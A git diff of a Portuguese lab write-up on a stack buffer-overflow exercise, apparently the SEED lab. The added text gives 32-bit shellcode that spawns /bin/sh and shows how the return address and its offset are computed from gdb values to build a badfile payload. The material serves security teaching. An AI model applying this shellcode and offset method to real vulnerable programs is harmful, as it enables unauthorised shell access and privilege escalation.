@@ -12,7 +12,7 @@ sudo ln -sf /bin/zsh /bin/sh
 
 Primeiramente, executamos o seguinte código :
 
-```
+```c
 #include <stdio.h>
 int main(){
 	char*name[2];
@@ -25,7 +25,7 @@ int main(){
 Reparamos que abriu uma shell na mesma pasta onde foi executado o programa.
 
 Depois executamos o call_shellcode.c:
-```
+```c
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -75,4 +75,35 @@ $2 = (char (*)[100]) 0xffffca8c
 ![code1](Images/code1.png)
 ![code1](Images/code2.png)
 
-Após obtermos os valores necessários, 
+Após obtermos os valores necessários, vamos usar o programa python para colocar conteúdo no nosso badfile, mas para tal temos de fazer alterações necessárias para funcionar:
+
+Na variável shellcode vamos meter o valor shellcode de 32-bits que executa uma shell:
+```py
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+).encode('latin-1')
+```
+
+De seguida, alterou-se o valor do start para guardar o valor do shell code no fim da lista.
+
+```py
+start = 517-len(shellcode)
+```
+
+Foi calculado o novo endereço de retorno que aponta para o código do shell a ser executado.
+
+```py
+ret    = 0xffffcaf8 + start
+```
+
+Usando os dois endereços obtidos durante o debug, determinou-se a localização do endereço de retorno em relação ao início do array (offset)
+
+```py
+offset = 0xffffcaf8 - 0xffffca8c + 4
+```
+
+
+
+
